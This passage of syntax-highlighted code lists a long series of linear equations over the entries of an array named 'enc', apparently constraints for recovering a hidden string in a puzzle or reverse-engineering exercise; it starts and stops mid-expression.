<span class="hljs-number">799</span>,<br>         <span class="hljs-number">3</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">3</span>] == <span class="hljs-number">2938</span>,<br>         <span class="hljs-number">5</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">19</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">4</span>] == <span class="hljs-number">2042</span>,<br>         <span class="hljs-number">7</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">5</span> * enc[<span class="hljs-number">5</span>] == <span class="hljs-number">1225</span>,<br>         <span class="hljs-number">11</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">33</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">44</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">77</span> * enc[<span class="hljs-number">6</span>] == <span class="hljs-number">7975</span>,<br>         <span class="hljs-number">21</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">24</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">7</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">7</span>] == <span class="hljs-number">229</span>,<br>         <span class="hljs-number">2</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">65</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">20</span> * enc[<span class="hljs-number">8</span>] == <span class="hljs-number">2107</span>,<br>         <span class="hljs-number">10</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">1</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">22</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">30</span> * enc[<span class="hljs-number">9</span>] == <span class="hljs-number">4037</span>,<br>         <span class="hljs-number">15</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">59</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">56</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">122</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">32</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>] == <span class="hljs-number">4950</span>,<br>         <span class="hljs-number">13</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">39</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">33</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">42</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">62</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">11</span> * enc[<span class="hljs-number">11</span>] == <span class="hljs-number">12544</span>,<br>         <span class="hljs-number">23</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">63</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">25</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">32</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">11</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>] == <span class="hljs-number">6585</span>,<br>         <span class="hljs-number">223</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">29</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">53</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">65</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">13</span>] == <span class="hljs-number">6893</span>,<br>         <span class="hljs-number">29</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">9</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">93</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">33</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">9</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">68</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">33</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">14</span> * enc[<span class="hljs-number">14</span>] == <span class="hljs-number">1883</span>,<br>         <span class="hljs-number">69</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">77</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">93</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">8</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">19</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">8</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">38</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">15</span>] == <span class="hljs-number">8257</span>,<br>         <span class="hljs-number">23</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">3</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">12</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">24</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">14</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">0</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">1</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">68</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">68</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">15</span> * enc[<span class="hljs-number">15</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">16</span>] == <span class="hljs-number">5847</span>,<br>         <span class="hljs-number">24</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span> * enc[<span class="hljs-number">2</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">13</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">67</span> * enc[<span class="hljs-number">7</span>] + <span class="hljs-number">146</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">50</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">1</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">27</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">45</span> * enc[<span class="hljs-number">15</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">17</span> * enc[<span class="hljs-number">17</span>] == <span class="hljs-number">18257</span>,<br>         <span class="hljs-number">25</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] - <span class="hljs-number">89</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">19</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">44</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">150</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">250</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">166</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">126</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">11</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">690</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">207</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">18</span>] == <span class="hljs-number">12591</span>,<br>         <span class="hljs-number">5</span> * enc[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">8</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">160</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">36</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">15</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">16</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">1</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">690</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">7</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">18</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">19</span> * enc[<span class="hljs-number">19</span>] == <span class="hljs-number">52041</span>,<br>         <span class="hljs-number">29</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">60</span> * enc[<span class="hljs-number">3</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">16</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">21</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">46</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">1</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">39</span> * enc[<span class="hljs-number">19</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">20</span>] == <span class="hljs-number">20253</span>,<br>         <span class="hljs-number">45</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">650</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">900</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">44</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">21</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">12</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">13</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">406</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">651</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">17</span>] - <span class="hljs-number">10</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] - <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] == <span class="hljs-number">18768</span>,<br>         <span class="hljs-number">555</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">6666</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">70</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">510</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">90</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">499</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>] - <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">610</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">221</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">23</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">102</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2050</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">406</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">665</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">201</span> * enc[<span class="hljs-number">21</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">22</span>] == <span class="hljs-number">111844</span>,<br>         <span class="hljs-number">1</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4444</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">5555</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">676</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">660</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">9</span> * enc[<span class="hljs-number">10</span>] - <span class="hljs-number">73</span> * enc[<span class="hljs-number">11</span>] - <span class="hljs-number">107</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">6</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">39</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">201</span> * enc[<span class="hljs-number">21</span>] - <span class="hljs-number">2</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] == <span class="hljs-number">159029</span>,<br>         <span class="hljs-number">520</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">222</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56655</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">73</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">1007</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">7777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2500</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">605</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">390</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">99999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">210</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] == <span class="hljs-number">2762025</span>,<br>         <span class="hljs-number">1323</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">333</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">5</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">66</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">660</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">2500</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">6666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">605</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">390</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">9999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">210</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] == <span class="hljs-number">1551621</span>,<br>         <span class="hljs-number">777</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">6969</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">55</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">220</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">777</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + <span class="hljs-number">65</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">17</span>] + <span class="hljs-number">100</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">999</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">232</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>] == <span class="hljs-number">948348</span>,<br>         <span class="hljs-number">97</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">6969</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">4</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">4</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">6</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">90</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">609</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">2</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">24</span> * enc[<span class="hljs-number">24</span>] + <span class="hljs-number">25</span> * enc[<span class="hljs-number">25</span>] - <span class="hljs-number">26</span> * enc[<span class="hljs-number">26</span>] + <span class="hljs-number">27</span> * enc[<span class="hljs-number">27</span>] == <span class="hljs-number">777044</span>,<br>         <span class="hljs-number">177</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">22</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">699</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">64</span> * enc[<span class="hljs-number">3</span>] - <span class="hljs-number">56</span> * enc[<span class="hljs-number">4</span>] - <span class="hljs-number">96</span> * enc[<span class="hljs-number">5</span>] - <span class="hljs-number">66</span> * enc[<span class="hljs-number">6</span>] + <span class="hljs-number">96</span> * enc[<span class="hljs-number">7</span>] - <span class="hljs-number">60</span> * enc[<span class="hljs-number">8</span>] - <span class="hljs-number">20</span> * enc[<span class="hljs-number">9</span>] + <span class="hljs-number">99</span> * enc[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> * enc[<span class="hljs-number">11</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">12</span>] + <span class="hljs-number">707</span> * enc[<span class="hljs-number">13</span>] + <span class="hljs-number">250</span> * enc[<span class="hljs-number">14</span>] + <span class="hljs-number">666</span> * enc[<span class="hljs-number">15</span>] + -<span class="hljs-number">9</span> * enc[<span class="hljs-number">16</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">17</span>] + -<span class="hljs-number">2</span> * enc[<span class="hljs-number">18</span>] + <span class="hljs-number">69</span> * enc[<span class="hljs-number">19</span>] + <span class="hljs-number">0</span> * enc[<span class="hljs-number">20</span>] + <span class="hljs-number">21</span> * enc[<span class="hljs-number">21</span>] + <span class="hljs-number">222</span> * enc[<span class="hljs-number">22</span>] + <span class="hljs-number">23</span> * enc[<span class="hljs-number">23</span>] - <span class="hljs-number">224</span> * enc[<span class="hljs-number">24</span>] + <span 